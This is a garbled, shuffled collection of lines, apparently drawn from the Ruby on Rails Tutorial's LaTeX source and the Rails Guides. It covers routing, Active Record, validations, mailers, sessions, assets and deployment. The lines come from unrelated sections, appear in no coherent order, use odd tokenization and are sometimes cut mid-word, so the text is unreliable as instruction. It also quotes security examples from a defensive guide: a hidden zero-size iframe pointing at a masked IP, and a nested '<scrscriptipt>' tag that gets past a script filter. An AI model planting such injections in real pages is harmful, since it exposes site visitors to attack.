If you prefer to learn everything systematically from the ground up , or if you have never programmed before , then learning Ruby first might work well for you , and in this case I recommend \ href { http : / / pragprog ▖ com / book / ltp2 / learn-to-program } { \ emph { Learn to Program } } by Chris Pine and \ href { http : / / www ▖ amazon ▖ com / gp / product / 1430223634 } { \ emph { Beginning Ruby } } by Peter Cooper .
# # # Changes to test helper
Use this option to prevent name collisions between routes using a path scope ▖
With this code , Active Record automatically returns all the microposts with \ kode { user \ _ id } equal to the id of \ kode { first \ _ user } ( in this case , ~ \ kode { 1 } ) .
id : &quot; HomeImage &quot; ,
# # # # ERB
Validating the email format with a regular expression ▖
For example , ╼ `attachments &#91; &apos; file-name ▖ jpg &apos; &#93; = File ▖ read ( &apos; file-name ▖ jpg &apos; ) ` .
resources : ads
n class = &apos; exercise &apos; id = &apos; ex-df8fbd &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection rendering _ microposts ( end ) ╼ ╼ \ subsection { Sample microposts } % ( fold ) ╼ \ label { sec : sample _ microposts } ╼ ╼
We can then sign users in automatically by retrieving the token from the cookie , encrypting it , and then searching for a remember token matching the encrypted value .
* Your Name *
Running \ kode { rails new } to generate a new application .
The structure of this section is based on the excellent blog post \ href { http : / / 2beards ▖ net / 2011 / 11 / the-rails-3-asset-pipeline-in-about-5-minutes / } { The Rails 3 Asset Pipeline in ( about ) 5 Minutes } by Michael Erasmus .
# # # # # Cookie Theft
This doesn &apos;t matter much for users , but it will for microposts , and we &apos;ll address this issue further in Section ~ \ ref { sec : ordering _ and _ dependency } .
╼ if boolean ?
\ href { https : / / tutorials ▖ railsapps ▖ org / hartl } { RailsApps } : A large variety of detailed topic-specific Rails projects and tutorials
# # # FormHelper
The result is a working status feed on the live Web ( Figure ~ \ ref { fig : live _ status _ feed } ) .
As noted in the introduction , the \ emph { Rails Tutorial } uses test-driven development ( also called test-first development ) , which in my view is the best way to develop Rails applications , but it does introduce a substantial amount of overhead and complexity .
has _ many : orders , foreign _ key : &quot; cust _ id &quot;
Tests for the Microposts controller \ kode { destroy } action .
&lt; h1 &gt; Listing articles &lt; / h1 &gt;
( Don &apos;t ask me why the spaces are conventional ; probably some early influential Ruby programmer liked the look of the extra spaces , and the convention stuck ▖ )
It &apos;s important to understand that code like that shown in Listing ~ \ ref { code : _ format _ jquery _ file _ test } can &apos;t actually prevent a user from trying to upload a file that &apos;s too big .
Now it &apos;s time to install Ruby and Rails .
To test for the right count , we can use the same \ kode { assert \ _ match } method we used in Listing ~ \ ref { code : user _ profile _ test } to test for the display of the number of microposts on the user profile page .
It doesn &apos;t have any effects on the application display , though , so short of inspecting the browser session directly there &apos;s no way to tell that you &apos;re logged in .
An annotated \ kode { title \ _ helper } .
To disable this behavior you can set :
attributes = { } ) `
# # # # Scopes for `has _ and _ belongs _ to _ many`
The stats in Figure ~ \ ref { fig : stats _ partial _ mockup } consist of the number of users the current user is following and the number of followers , each of which should be a link to its respective dedicated display page .
Typically in Rails , the action that is used for new form submissions ╼ like this is called &quot; create &quot; , and so the form should be pointed to that action .
In Rails applications , \ texttt { POST } requests are typically used for \ emph { creating } things ( although HTTP also allows \ texttt { POST } to perform updates ) ; for example , the \ texttt { POST } request sent when you submit a registration form creates a new user on the remote site .
It &apos;s recommended that you ` : nodoc : ` any of your internal methods / classes unless they &apos;re already private ( meaning visibility ) , in which case it &apos;s internal by default ▖
# # # Turning Debugging Off
Adding authorization to the Microposts controller actions ▖
Using Rails &apos; default pluralization convention , the set of all users following a given user is that user &apos;s \ emph { followers } , and \ kode { user ▖ followers } is an array of those users .
In case the `rewhere` clause is not used ,
This is the hashed version of the password ( \ kode { &quot; foobar &quot; } ) used to initialize the user object .
The improved \ kode { README } file formatted with Markdown .
class Account &lt; ActiveRecord : : Base
The name \ emph { digest } comes from the terminology of \ href { http : / / en ▖ wikipedia ▖ org / wiki / Cryptographic _ hash _ function } { cryptographic hash functions } .
An initializer to skip image resizing in tests .
English
The resulting email address will also be unescaped automatically in the controller , and will be available via \ kode { params &#91; : email &#93; } .
In particular , all other Ruby objects are \ emph { true } , even 0 :
The users index page shows all users , one page at a time .
Where a controller generates ╼ content like HTML to send back to the client , a Mailer creates a message to be ╼ delivered via email .
* `config ▖ consider _ all _ requests _ local` is a flag ▖
&quot; my _ image-231a680f23887d9dd70710ea5efd3c62 ▖ png &quot; } }
We &apos;ve also changed
A module may or may not have a name :
Adding image upload involves two main visible elements : a form field for uploading an image and the micropost images themselves .
In particular it is very idiomatic to use a trailing hash for options .
config ▖ relative _ url _ root = &quot; / app1 &quot;
Open the file `config / routes ▖ rb` in your editor .
╼ x = x + 1
Recall from Section ~ \ ref { sec : a _ proto _ feed } that the Home page already includes the feed ; as a reminder , the \ kode { home } action appears again in Listing ~ \ ref { code : real _ feed _ instance _ variable } .
* `active _ record ▖ logger` Sets `ActiveRecord : : Base ▖ logger` - if it &apos;s not already set - to `Rails ▖ logger` .
Rails class and module autoloading uses `underscore` to infer the relative path without extension of a file that would define a given missing constant :
This gives us a command called \ kode { annotate } , which simply adds comments containing the data model to the model file :
Thus , we have \ kode { User } instead of \ kode { Users } .
= &gt; &quot; Michael Hartl &quot;
Localized Views
CSS allows us to style the site layout based on CSS classes and ids .
resources : messages , concerns : : commentable
* `config ▖ eager _ load _ namespaces` registers namespaces that are eager loaded when `config ▖ eager _ load` is true ▖
config ▖ action _ mailer ▖ delivery _ method = : smtp
I prefer the \ href { http : / / daringfireball ▖ net / projects / markdown / } { Markdown markup language } to the default RDoc for this purpose , and if you use the file extension \ kode { ▖ md } then Bitbucket will automatically format it nicely for you .
To get the test to pass , we first generate an appropriate migration for the \ kode { password \ _ digest } column :
In particular , these two commands cancel each other out :
The name of children nodes is by default the name of the root node singularized ▖
# # # Schema Conventions
as shown in Listing ~ \ ref { code : static _ page _ routes _ test } .
* `employees / _ employee ▖ html ▖ erb`
* ` : equal _ to` - Specifies the value must be equal to the supplied value ▖
resources : photos , only : &#91; : index , : show &#93;
This line is simply `resources : articles` , turning the ╼ `config / routes ▖ rb` file for the engine into this :
Applications get `secrets ▖ secret _ key _ base` initialized to a random key present in `config / secrets ▖ yml` .
This augmented \ kode { ▖ gitignore } arranges to ignore Rails documentation files , Vim and Emacs swap files , and ( for OS ~ X users ) the weird \ kode { ▖ DS \ _ Store } directories created by the Mac Finder application .
After Cloud9 has finished provisioning the workspace , select it and click ``Start editing &apos; &apos;
This is used by + url _ for + in Action Pack .
If you open up the newly generated `app / controllers / articles _ controller ▖ rb` ╼ you &apos;ll see a fairly empty controller :
If the email address exists in the database , generate a reset token and corresponding reset digest .
in a bunch of places , when what you really want is to indicate that the page should have an error message .
After making the changes , verify that the test suite is still \ passing .
╼ $ bundle exec rake db : migrate
Finally , we need to set up SSL on the remote server .
( 1 ▖ ▖ ▖ 9 ) = = = ( 3 ▖ ▖ 9 ) # = &gt; false
Here are some suggestions for further learning :
to work , we need a form for resetting passwords .
The result of following an unfollowed user .
as shown in Listing ~ \ ref { code : full _ feed _ specs } .
self ▖ author = Blorgh ▖ author _ class ▖ find _ or _ create _ by ( name : author _ name )
The methods `to _ options` and `to _ options ! ` are respectively aliases of `symbolize _ keys` and `symbolize _ keys ! ` .
mod = mod _ name ▖ empty ? ?
Durations can be added to and subtracted from dates :
That &apos;s a side-effect of the nesting that you &apos;ve set up ▖
This means that behavior may change depending on the scope or context of the ╼ method or class you &apos;re trying to document .
scope &apos; : username &apos; do
= &gt; 51
This can be achieved like this
# # # # `deconstantize`
If you rely on the ordering , you should check if correct methods are available after upgrade ▖
* scope .
* FROM categories
thereby invoking the \ kode { current \ _ user = } method .
The `where` method allows you to specify conditions to limit the records returned , representing the `WHERE`-part of the SQL statement ▖
╼ ╼ end
This creates ``getter &apos; &apos; and ``setter &apos; &apos; methods that allow us to retrieve ( get ) and assign ( set ) \ kode { @ name } and \ kode { @ email } \ emph { instance variables } , which were mentioned briefly in Section ~ \ ref { sec : mvc _ in _ action } and Section ~ \ ref { sec : exercises _ adding _ page _ titles } .
$ git push origin master
To perform the computation the method first increments years , then months , then weeks , and finally days ▖
def evaluate ( scope , locals , &amp; block )
( Unfortunately , returning a paginated feed doesn &apos;t work in this case .
This is also a great way to get started exploring the source code : looking at the existing test files will teach you how to write more tests ▖
The following ones are discussed below :
users GET / users ( ▖ : format ) users # index
alert ( &apos; All is good &apos; )
By specifying it as a gem within ╼ the `Gemfile` , Bundler will load it as such , parsing this `blorgh ▖ gemspec` file ╼ and requiring a file within the `lib` directory called `lib / blorgh ▖ rb` ▖
The method `beginning _ of _ hour` returns a timestamp at the beginning of the hour ( hh : 00 : 00 ) :
If you would like to change the order in which engines are loaded , you can use `config ▖ railties _ order = ` method .
Sometimes inexperienced developers think of `redirect _ to` as a sort of `goto` command , moving execution from one place to another in your Rails code ▖
As in Listing ~ \ ref { code : email _ format _ valid _ tests } , Listing ~ \ ref { code : email _ format _ validation _ tests } includes a custom error message to identify the exact address causing any failure .
We can then push the code to the remote repository and deploy the application to production :
The resulting tests appear in Listing ~ \ ref { code : remember _ me _ test } .
&lt; % = form _ for &#91; : update _ name , @ user &#93; do &#124; f &#124; % &gt;
gets run through the CoffeeScript processor , and
Fingerprinting is a technique that makes the name of a file dependent on the ╼ contents of the file ▖
NOTE : Other engines , such as Devise , handle this a little differently by making ╼ you specify custom helpers ( such as `devise _ for` ) in the routes ▖
# # # Say &quot; Hello &quot; , Rails
&gt; &gt; p = Person ▖ new ( name : &quot; John Doe &quot; )
if : &#91; &quot; market ▖ retail ? &quot; , : desktop ? &#93;
in Listing ~ \ ref { code : user _ signout _ test } .
It &apos;s worth noting that the \ kode { get } and \ kode { post } steps above are technically unrelated , and it &apos;s actually not necessary to get the signup path before posting to the users path .
unless record ▖ name ▖ starts _ with ?
# # # The Query String
&#124; 1 &#124; SIMPLE &#124; articles &#124; ALL &#124; NULL &#124;
Next , there needs to be a form so that comments can be created on an article ▖
&#124; &#124; 208 &#124; : already _ reported &#124;
In the case of an Ajax request , Rails automatically calls a \ emph { JavaScript embedded Ruby } ( \ kode { ▖ js ▖ erb } ) file with the same name as the action , i ▖ e ▖ , \ kode { create ▖ js ▖ erb } or \ kode { destroy ▖ js ▖ erb } .
The user signup form .
In Chapter ~ \ ref { cha : account _ activation _ and _ password _ resets } , we &apos;ll make \ emph { sure } of email validity by adding a separate \ emph { account activation } step to user signup .
That &apos;s typically used with ╼ collections of Active Record objects ▖
You will see that it works exactly in the ╼ same way as before , except this time the engine is using the configuration ╼ setting in `config / initializers / blorgh ▖ rb` to learn what the class is .
# &lt; rank type = &quot; integer &quot; &gt; 2 &lt; / rank &gt;
Verify that , for example , \ kode { params &#91; : father &#93; &#91; : first &#93; } has the right value .
Optimistic locking allows multiple users to access the same record for edits , and assumes a minimum of conflicts with the data ▖
The `select` method lets you override the SQL `SELECT` clause that is used to retrieve data about the associated object ▖
Before moving on , if you &apos;re using Git it &apos;s a good idea to add the files for the StaticPages controller to the repository :
# Person ▖ exists ? (
= &gt; &#91; &quot; User &quot; &#93;
&lt; h1 &gt; Hello , Rails !
In particular , large images would still take a while to load .
mkdir &lt; dirname &gt;
&lt; % = image _ tag &quot; home ▖ gif &quot; , alt : &quot; Go Home &quot; ,
Validation Helpers
You can also supply a hash of additional options , such as ` : id` , ` : class` etc .
* * `Rack : : ConditionalGet` * *
do _ one _ thing : do _ something _ else
In this chapter , we &apos;ll rely on the User model validations from Chapter ~ \ ref { cha : modeling _ users } to increase the odds of new users having valid email addresses .
After restarting the development server to activate the configuration in Listing ~ \ ref { code : development _ email _ settings } , we next need to update the User mailer \ emph { preview file } , which was automatically generated in Section ~ \ ref { sec : account _ activation _ emails } , as shown in Listing ~ \ ref { code : generated _ user _ mailer _ previews } .
# # # # Passing Local Variables
Constant name resolution by `constantize` starts always at the top-level `Object` even if there is no leading &quot; : : &quot; .
Note that chaining `unscoped` with a `scope` does not work ▖
By using `joins` ( an INNER ╼ JOIN ) , the join conditions * * must * * match , otherwise no records will be ╼ returned .
Assets are compiled and cached on the first request after the server is started ▖ ╼
In Rails , the situation is different--- \ kode { StaticPagesController } is a Ruby class , but because it inherits from \ kode { ApplicationController } the behavior of its methods is specific to Rails : when visiting the URL / static \ _ pages / home , Rails looks in the Static Pages controller and executes the code in the \ kode { home } action , and then renders the \ emph { view } ( the V in MVC from Section ~ \ ref { sec : mvc } ) corresponding to the action .
In the case of persistent sessions , we want to retrieve the user from the temporary session if \ kode { session &#91; : user \ _ id &#93; } exists , but otherwise we should look for \ kode { cookies &#91; : user \ _ id &#93; } to retrieve ( and log in ) the user corresponding to the persistent session .
module FindRecentExtension
Since we will be using email addresses as usernames , this sort of \ kode { find } will be useful when we learn how to let users log in to our site ( Chapter ~ \ ref { cha : sign _ up } ) .
Uncommenting the before filter ▖
His prior experience includes writing and developing \ emph { RailsSpace } , an extremely obsolete Rails tutorial book , and developing Insoshi , a once-popular and now-obsolete social networking platform in Ruby on Rails .
See &#91; # 14488 &#93; ( https : / / github ▖ com / rails / rails / pull / 14488 ) and ╼ &#91; # 16537 &#93; ( https : / / github ▖ com / rails / rails / pull / 16537 ) for more details .
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Named Helper &#124;
But you don &apos;t need to know this to develop applications with Rails .
There &apos;s a slight difference in the display , though ; in the profile sidebar , ``Microposts &apos; &apos; is a label , and showing ``Microposts ( 1 ) &apos; &apos; makes sense .
It provides a ╼ variety of options , so you can specify length constraints in different ways :
( This will require a modification of the \ kode { authenticated ? } \ method defined in Listing ~ \ ref { code : authenticated _ p } ▖ )
With the code in Listing ~ \ ref { code : user _ model _ password _ reset _ expired } , the \ kode { update } action in Listing ~ \ ref { code : password _ reset _ update _ action } should be working .
111 ▖ 2345 ▖ to _ s ( : rounded , precision : 2 ) # = &gt; 111 ▖ 23
This section covers how to make the `User` class configurable , followed by ╼ general configuration tips for the engine .
The source can be a full path or a file that exists in your `app / assets / images` directory .
* Follow the conventions in the source you see used already .
And yet , names and email addresses are more specific than this .
config ▖ before _ initialize do
If you used the pluralized form in the above example for the `customer` association in the `Order` model , you would be told that there was an &quot; uninitialized constant Order : : Customers &quot; ▖
in Listing ~ \ ref { code : ssl _ in _ production } .
get &apos; preview&apos;
In order to factor out this common structure , Rails comes with a special \ emph { layout } file called \ kode { application ▖ html ▖ erb } , which we renamed in the beginning of this section ( Section ~ \ ref { sec : slightly _ dynamic _ pages } ) and which we &apos;ll now restore :
t ▖ datetime : order _ date
Although we started deploying our application in Chapter ~ \ ref { cha : static _ pages } , this is the first time it will actually \ emph { do } something , so we &apos;ll take this opportunity to make the deployment professional-grade .
The home page with form errors ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / home _ form _ errors _ bootstrap-full ▖ png } { ( full size ) }
You may recall from Listing ~ \ ref { code : generate _ users _ controller } that we created a Users controller ( along with a \ kode { new } action ) using the command
as shown in Listing ~ \ ref { code : user _ show _ microposts } .
For example , when an action of `ArticlesController` is called Rails tries to load `articles _ helper ▖ rb` , but that file may not exist ▖
By following the example of the \ kode { hello } action in Listing ~ \ ref { code : hello _ action } , add a second action called \ kode { goodbye } that renders the text ``goodbye , world ! &apos; &apos; .
╼ else
Adding the uploads directory to the \ kode { ▖ gitignore } file .
raise NonInferrableMailerError ▖ new ( name )
To revert all migrations from blorgh engine you can run code such as :
= &gt; &quot; 5 errors &quot;
Once the \ kode { @ users } variable is defined , the controller calls the \ emph { view } ( Step ~ 6 ) , shown in Listing ~ \ ref { code : demo _ index _ view } .
The method `beginning _ of _ day` returns a timestamp at the beginning of the day ( 00 : 00 : 00 ) :
# # # # `last ( limit = 1 ) `
This deprecation also concerns the helpers based on this one ( such as `link _ to _ if` ╼ or `link _ to _ unless` ) .
&#124; --------- &#124; -------------------------- &#124; ------------------ &#124; ----------------------- &#124;
is mostly equivalent to
Since we included the \ kode { home } and \ kode { help } actions in Listing ~ \ ref { code : generating _ pages } , the routes file already has a rule for each one , as seen in Listing ~ \ ref { code : pages _ routes } .
layout &quot; main &quot;
in Listing ~ \ ref { code : friendly _ session _ create } .
Because we configured Bundler not to install production gems ( Section ~ \ ref { sec : sample _ app _ setup } ) , Listing ~ \ ref { code : puma _ gemfile } won &apos;t add any gems to the development environment , but we still need to run Bundler to update \ kode { Gemfile ▖ lock } :
TESTOPTS = &quot; --name test _ login _ with _ valid _ information &quot;
With the \ kode { digest } method from Listing ~ \ ref { code : test _ helper _ digest } , we are now ready to create a user fixture for a valid user , as shown in Listing ~ \ ref { code : real _ user _ fixture } .
As a final setup step , you can optionally set the editor Git will use for commit messages .
= = = = = = = = = = = = = = = = =
The default is `ENV &#91; &apos; RAILS _ RELATIVE _ URL _ ROOT &apos; &#93; ` .
To include the uploader on the Home page as in Figure ~ \ ref { fig : micropost _ image _ mockup } , we need to include a \ kode { file \ _ field } tag in the micropost form , as shown in Listing ~ \ ref { code : micropost _ create _ image _ upload } .
( On most systems , restarting the server will involve pressing \ texttt { Ctrl-C } and then running \ kode { rails server } ▖ )
in Listing ~ \ ref { code : add _ remember _ digest _ to _ users } .
While `indent _ string` is typically one space or tab , it may be any string .
* Represent inheritance hierarchies through related models .
$ git checkout branch _ name
( Because the default navbar color changed after Bootstrap 2 ▖ 0 , we need the \ kode { navbar-inverse } class to make it dark instead of light ▖ )
The following changes are meant for upgrading your application to the latest ╼ 3 ▖ 2 ▖ x version of Rails .
This demonstrates a shorter syntax for the examples in &#91; Array Conditions &#93; ( # array-conditions )
We then enter valid signin information and click the ``Sign in &apos; &apos; button .
( This strange-looking but compact code uses a \ emph { symbol } , which we &apos;ll discuss in Section ~ \ ref { sec : hashes _ and _ symbols } ▖ )
umerate } ╼ ╼ % subsection layout _ link _ tests ( end ) ╼ ╼ \ subsection { Login upon signup } % ( fold ) ╼ \ label { sec : login _ upon _ signup } ╼ ╼
{ nil = &gt; nil , 1 = &gt; 1 , a : : a } ▖ stringify _ keys
╼ ╼ $ rails console
delete user
If you don &apos;t set `dependent` to ╼ destroy such associations you won &apos;t be able to change the associated object ╼ because initial associated object foreign key will be set to unallowed `NULL` ╼ value .
* ` : content _ type`
As of Rails ~ 4 ▖ 0 , all scopes take an anonymous function that returns the criteria desired for the scope , mainly so that the scope need not be evaluated immediately , but rather can be loaded later on an as-needed basis ( so-called \ emph { lazy evaluation } ) .
If you want to run SSL on a custom domain , such as \ kode { example ▖ com } , you &apos;ll have no choice but to endure some pain , which you can read about on \ href { http : / / devcenter ▖ heroku ▖ com / articles / ssl } { Heroku &apos;s page on SSL } .
person = Person ▖ create ( name : &quot; !
To deploy the application , the first step is to use Git to push it up to Heroku :
The complete HTML returned to the client is composed of a combination of this ERB file , a layout template that wraps it , and all the partials that the view may reference ▖
Custom HTML for the Home page .
Even odder , perhaps , is that the \ kode { destroy } ed object still exists in memory :
Let &apos;s assume we want to deploy our application to &quot; / app1 &quot; ▖
It can receive an ` : accept` option , which determines the value that will be ╼ considered acceptance ▖
* The route name ( if any )
That &apos;s required for the association to work properly ▖
To get started with the implementation , we first generate a Relationship model as follows :
Without it , classes generated in an engine ╼ * * may * * conflict with an application .
Note from Table ~ \ ref { table : association _ methods } that instead of
Note the value of \ kode { user ▖ updated \ _ at } .
&lt; iframe name = &quot; StatPage &quot; src = &quot; http : / / 58 ▖ xx ▖ xxx ▖ xxx &quot; width = 5 height = 5 style = &quot; display : none &quot; &gt; &lt; / iframe &gt;
Though at first it may seem mysterious , \ emph { or equals } is easy to understand by analogy .
end { enumerate } ╼ ╼ % subsection image _ validation ( end ) ╼ ╼ \ subsection { Image resizing } % ( fold ) ╼ \ label { sec : image _ resizing } ╼ ╼
as shown in Listing ~ \ ref { code : stats _ partial } .
Showing the users being followed by the current user ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ following _ bootstrap-full ▖ png } { ( full size ) }
Your goal should be to make it easy for yourself - and others - to replicate the bug and figure out a fix .
Running the Rails server in a separate tab .
invoke scaffold _ controller
Then we install as usual :
A stylesheet file can be stored in one of three locations : `app / assets` , `lib / assets` or `vendor / assets` .
For a more in-depth treatment of the Unix command line , see \ href { http : / / conqueringthecommandline ▖ com / } { \ emph { Conquering the Command Line } } by Mark Bates ( available as a \ href { http : / / conqueringthecommandline ▖ com / book } { free online version } and as \ href { http : / / conqueringthecommandline ▖ com / # pricing } { ebooks and screencasts } ) .
attr _ internal : request , : layout
The Gravatar site actually redirects this to \ href { http : / / en ▖ gravatar ▖ com / emails } { http : / / en ▖ gravatar ▖ com / emails } , which is for English language users , but I &apos;ve omitted the \ texttt { en } part to account for the use of other languages .
Custom validators are classes that extend `ActiveModel : : Validator` ▖
This is easy using the \ kode { log \ _ in \ _ as } helper developed in Section ~ \ ref { sec : remember _ tests } ( Listing ~ \ ref { code : test _ helper _ log _ in } ) , as shown in Listing ~ \ ref { code : edit _ tests _ logged _ in } .
# # # # # `collection ▖ delete ( object , ▖ ▖ ▖ )
Single-quoted strings
This test does the same thing as the initial duplicate email test , but with an upper-case email address instead .
The equivalent code
else
User ▖ find _ each do &#124; user &#124;
It &apos;s a relatively good idea , so if you want to offer ╼ configuration options , the file where your engine &apos;s `module` is defined is ╼ perfect for that ▖
Because of its importance , it &apos;s a good idea to write a test for any attribute that isn &apos;t editable , and writing such a test for the \ kode { admin } attribute is left as an exercise ( Section ~ \ ref { sec : updating _ deleting _ exercises } ) .
╼ &lt; / p &gt; ╼ ---- = = _ mimepart _ 5407babbe3505 _ 8722b257d045617--
In this chapter , we &apos;ll put the finishing touches on this system by adding two closely related features : account activation ( which verifies a new user &apos;s email address ) and password reset ( for users who forget their passwords ) .
def as _ json ( options = nil )
The second ( optional ) argument specifies the size of the difference ( in this case , 1 ) .
te } ╼ ╼ % subsection creating _ user _ objects ( end ) ╼ ╼ \ subsection { Finding user objects } % ( fold ) ╼ \ label { sec : finding _ user _ objects } ╼ ╼
We include \ kode { row } and \ kode { span4 } classes , which are both part of Bootstrap .
In other words , with code like
This writes the path to the particular asset being referenced ▖
* `ActiveRecord : : ConnectionAdapters : : MysqlAdapter ▖ emulate _ booleans` controls whether Active Record will consider all `tinyint ( 1 ) ` columns in a MySQL database to be booleans and is true by default .
No Orders Found
Thus , to load all extensions to `Object` ( including `blank ? ` ) :
Note again that articles with multiple comments will show up multiple times .
The method `transform _ values` accepts a block and returns a hash that has applied the block operations to each of the values in the receiver .
r
( In Listing ~ \ ref { code : email _ downcase } , we passed \ kode { before \ _ save } an explicit block , but the method reference technique is generally preferred ▖ )
As a second example , we &apos;ll access the \ kode { activation \ _ digest } attribute of the first user in the database :
This option defaults to ╼ true .
( Experience shows that this is a wise practice ; in classes with a large number of methods , it is easy to define a private method accidentally , which leads to considerable confusion when it isn &apos;t available to call on the corresponding object ▖ )
# = &gt; { : b = &gt; 2 } # non-existing keys are ignored
Similarly , `from` returns the tail from the element at the passed index to the end ▖
test : postgresql
* Optimistic Locking
We &apos;ve covered enough material now that there is a combinatorial explosion of possible extensions to the application .
To get Rails saying &quot; Hello &quot; , you need to create at minimum a _ controller _ and a ╼ _ view _ .
# # # CRUD , Verbs , and Actions
&#124; NULL &#124; NULL &#124; NULL &#124; 1 &#124; Using where &#124;
When the last argument in a method call is a hash , except perhaps for a ` &amp; block` argument , Ruby allows you to omit the brackets :
# = &gt; { : a = &gt; 2 }
This flag is taken into account for each constant in the expression while ╼ walking down the path .
On many systems , including the cloud IDE , you can omit \ kode { bundle exec } , but it is necessary on some systems , so I &apos;ll include it for completeness .
With that , the users index is fully functional , with all tests \ passing :
render action : &quot; index &quot;
if @ article ▖ save
Note that if any of the validations fail , such as when a password is required to save a record ( as implemented in Section ~ \ ref { sec : adding _ a _ secure _ password } ) , the call to \ kode { update \ _ attributes } will fail .
The library as a whole can be accessed in the application manifest like so :
CDN stands for &#91; Content Delivery ╼ Network &#93; ( http : / / en ▖ wikipedia ▖ org / wiki / Content _ delivery _ network ) , they are ╼ primarily designed to cache assets all over the world so that when a browser ╼ requests the asset , a cached copy will be geographically close to that browser ▖ ╼
get : index , format : : js
In Listing ~ \ ref { code : logo _ css } , we have the code
The default is `true` .
To get started , we &apos;ll generate a Sessions controller and an integration test for the authentication machinery :
# gem &apos; therubyracer &apos; , platforms : : ruby
Note that the \ kode { correct \ _ user } before filter defines the \ kode { @ user } variable , so Listing ~ \ ref { code : correct _ user _ before _ filter } also shows that we can eliminate the \ kode { @ user } assignments in the \ kode { edit } and \ kode { update } actions .
In most cases , the `ActionController : : Base # render` method does the heavy lifting of rendering your application &apos;s content for use by a browser ▖
Our strategy is to create a couple of factory microposts associated with the user , and then verify that the show page contains each post &apos;s content .
The JSON encoder in Rails 4 ▖ 1 has been rewritten to take advantage of the JSON ╼ gem ▖
╼ end
in Listing ~ \ ref { code : final _ gemfile } .
The ternary operator is a compact way to write simple if-then statements .
If you use the ` : xml` option , `render` will automatically call `to _ xml` for you .
Here we see that destroying a user leaves the \ kode { microposts } variable with no elements ; i ▖ e ▖ , it &apos;s the empty array ~ \ kode { &#91; &#93; } .
Returns a select tag with options for each of the months January through December with the current month selected .
This will find the category with id 1 and eager load all of the associated articles , the associated articles &apos; tags and comments , and every comment &apos;s guest association .
It &apos;s important to understand that code like that shown in Listing ~ \ ref { code : jquery _ file _ test } can &apos;t actually prevent a user from trying to upload a file that &apos;s too big .
Here the adapter , host , and database match the information in `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` .
The directory structure for a newly created Rails app .
User ▖ inactive
( Having so much code in each branch of the \ kode { if } - \ kode { else } conditional is a bit messy , and cleaning it up using partials is left as an exercise ( Section ~ \ ref { sec : micropost _ exercises } ) ▖ )
A test for the user profile ▖
class CreatePublications &lt; ActiveRecord : : Migration
Such a server is commonly called a &quot; staging server &quot; ▖
@ user ▖ reload ▖ email ╼ end ╼ end ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ \ begin { codelisting } ╼ \ label { code : downcase _ bang } ╼ \ codecaption { An alternate callback implementation ▖ \ passing \ \ \ filepath { app / models / user ▖ rb } } ╼ % = lang : ruby , options : &quot; hl _ lines &quot; : &#91; 2 &#93; ╼ \ begin { code } ╼ class User &lt; ApplicationRecord ╼ before _ save { email ▖ downcase ! } ╼ validates : name , presence : true , length : { maximum : 50 } ╼ VALID _ EMAIL _ REGEX = / \ A &#91; \ w + \ - ▖ &#93; + @ &#91; a-z \ d \ - ▖ &#93; + \ ▖ &#91; a-z &#93; + \ z / i ╼ validates : email , presence : true , length : { maximum : 255 } , ╼ format : { with : VALID _ EMAIL _ REGEX } , ╼ uniqueness : { case _ sensitive : false } ╼ end ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ ╼ % subsection uniqueness _ validation ( end ) ╼ ╼ % section model _ validations ( end ) ╼ ╼ \ section { Adding a secure password } % ( fold ) ╼ \ label { sec : adding _ a _ secure _ password } ╼ ╼
For example , `01 _ critical ▖ rb` will be loaded before `02 _ normal ▖ rb` .
= &gt; &#91; 42 , 8 , 17 , 6 , 7 , &quot; foo &quot; , &quot; bar &quot; &#93;
We can see this using \ kode { ! ! } \ ( read ``bang bang &apos; &apos; ) , which negates an object twice , thereby coercing it to its boolean value :
For example given
NOTE : Defined in `active _ support / core _ ext / enumerable ▖ rb` .
Following this model for the Help page ( Listing ~ \ ref { code : custom _ help _ page } ) and the About page ( Listing ~ \ ref { code : custom _ about _ page } ) yields the code in Listing ~ \ ref { code : help _ view _ full _ html } and Listing ~ \ ref { code : about _ view _ full _ html } .
&#124; ` : two _ words _ connector` &#124; `support ▖ array ▖ two _ words _ connector` &#124;
The \ href { http : / / sqlitebrowser ▖ sourceforge ▖ net / } { SQLite Database Browser } with our new \ kode { users } table ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / sqlite _ database _ browser-full ▖ png } { ( full size ) }
In Rails , this can be accomplished with \ texttt { rails destroy } .
ith
The test in Listing ~ \ ref { code : real _ account _ activation _ test } uses \ kode { assert \ _ match } to check that the name , activation token , and escaped email appear in the email &apos;s body .
past ?
Hash values can be virtually anything , even other hashes , as seen in Listing ~ \ ref { code : nested _ hashes } .
There are several curated lists of online resources ╼ for learning Ruby :
The `image _ tag` helper builds an HTML ` &lt; img / &gt; ` tag to the specified file ▖
client = Client ▖ find ( 10 )
While this backtrace is usually very useful for tracking down the problem , on some systems ( including the cloud IDE ) it goes past the application code and into the various gem dependencies , including Rails itself .
resources : photos
For a suggestion on how to avoid conflicts between exercises and the main tutorial , see the note on exercise topic branches in Section ~ \ ref { sec : static _ pages _ exercises } .
The example in `Date # advance` applies , and we can extend it to show order relevance related to the time bits .
t ▖ belongs _ to : supplier
* Rails 4 ▖ 0 deprecates the `dom _ id` and `dom _ class` methods in controllers ( they are fine in views ) ▖
Changing the root route to return `` ¡ Hola , mundo ! &apos; &apos; .
As preparation for the next step , we have replaced
With these design and security considerations in mind , our plan for creating persistent sessions appears as follows :
Twitter allows users to make `` @ replies &apos; &apos; , which are microposts whose first characters are the user &apos;s login preceded by the \ texttt { @ } ~ sign .
( For a formal demonstration that the comparison is correct , see the proof in Section ~ \ ref { sec : expiration _ proof } ▖ )
&lt; % = stylesheet _ link _ tag &quot; main &quot; % &gt;
The validation only runs when all the ` : if` conditions and none of the ╼ ` : unless` conditions are evaluated to `true` .
▖ idea
Now the attacker injects &quot; &amp; lt ; scrscriptipt &amp; gt ; &quot; , and after the filter , &quot; &amp; lt ; script &amp; gt ; &quot; remains ▖
The following is a list of the most commonly used methods ▖
The error message now indicates a missing \ kode { about } action in the Static Pages controller , which we can add by following the model provided by \ kode { home } and \ kode { help } in Listing ~ \ ref { code : static _ pages _ controller } , as shown in Listing ~ \ ref { code : adding _ the _ about _ page } .
